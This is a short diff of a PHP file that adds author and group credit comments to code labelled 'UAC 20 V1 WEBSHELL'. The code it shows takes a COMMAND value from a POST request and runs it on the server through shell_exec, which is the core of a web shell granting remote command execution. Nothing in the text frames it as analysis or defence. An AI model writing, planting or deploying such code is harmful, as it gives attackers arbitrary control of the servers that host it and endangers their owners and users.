@@ -1,4 +1,9 @@
 <?php
+// UAC 20 V1 WEBSHELL
+// AUTHOR : MatrixTM26
+// GitHub : https://github.com/MatrixTM26
+// CO-AUTHORED: astronrx736 & UAC 20 GROUP
+
 if (isset($_POST["COMMAND"]) && !empty($_POST["COMMAND"])) {
     $cmd = $_POST["COMMAND"];
     $output = shell_exec($cmd);
